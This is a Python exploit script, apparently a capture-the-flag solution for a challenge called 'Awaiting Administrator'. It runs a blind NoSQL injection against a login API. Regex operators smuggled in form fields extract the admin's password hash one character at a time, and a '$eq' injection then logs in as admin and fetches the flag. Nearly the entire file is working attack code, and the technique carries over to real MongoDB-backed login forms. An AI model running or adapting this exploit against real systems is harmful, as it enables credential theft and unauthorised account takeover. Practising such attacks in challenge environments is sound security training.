"""
Awaiting Administrator - NoSQL Injection Exploit
Extracts admin password hash via blind regex injection and authenticates using $eq operator
"""
import requests
import sys

BASE_URL = "https://mnbvcxzqwertyuip-csc26.cybersecuritychallenge.al"
LOGIN_ENDPOINT = f"{BASE_URL}/api/login"
ADMIN_ENDPOINT = f"{BASE_URL}/admin"

CHARS = "0123456789abcdef"  # 32-char hex = MD5 hash


def extract_password_hash():
    """Extract admin password hash character by character using $regex injection."""
    print("[*] Starting blind NoSQL regex extraction...")
    password = ""
    
    for pos in range(32):
        for c in CHARS:
            regex = f"^{password}{c}"
            
            # Inject $regex operator via URL-encoded body
            data = {
                "username": "admin",
                "password[$regex]": regex
            }
            
            try:
                response = requests.post(LOGIN_ENDPOINT, data=data, timeout=10)
                
                # Oracle: "Wrong password" = regex matched a user
                if "Wrong password" in response.text:
                    password += c
                    print(f"[{pos+1}/32] {password}")
                    break
            except requests.RequestException as e:
                print(f"[!] Request failed: {e}")
                sys.exit(1)
    
    print(f"\n[+] Extracted hash: {password}")
    return password


def authenticate_with_hash(password_hash):
    """Authenticate using $eq operator to bypass server-side hashing."""
    print(f"\n[*] Authenticating as admin with extracted hash...")
    
    # Inject $eq operator to match stored hash directly
    data = {
        "username": "admin",
        "password[$eq]": password_hash
    }
    
    try:
        session = requests.Session()
        response = session.post(LOGIN_ENDPOINT, data=data)
        
        if response.status_code == 200 and "Welcome" in response.text:
            print("[+] Authentication successful!")
            return session
        else:
            print(f"[!] Authentication failed: {response.text}")
            return None
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None


def get_flag(session):
    """Access admin panel to retrieve the flag."""
    print("[*] Accessing admin panel...")
    
    try:
        response = session.get(ADMIN_ENDPOINT)
        
        if "flag" in response.text.lower() or "CSC26{" in response.text:
            print("[+] Flag retrieved!\n")
            # Extract flag from HTML
            import re
            flag_match = re.search(r'CSC26\{[^}]+\}', response.text)
            if flag_match:
                print(f"🚩 {flag_match.group(0)}")
            else:
                print(response.text)
        else:
            print("[!] Could not access admin panel")
            print(response.text[:500])
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")


def main():
    print("="*60)
    print("Awaiting Administrator - NoSQL Injection Exploit")
    print("="*60)
    
    # Step 1: Extract password hash via blind regex injection
    password_hash = extract_password_hash()
    
    # Step 2: Authenticate using $eq operator bypass
    session = authenticate_with_hash(password_hash)
    
    if session:
        # Step 3: Access admin panel and get flag
        get_flag(session)
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
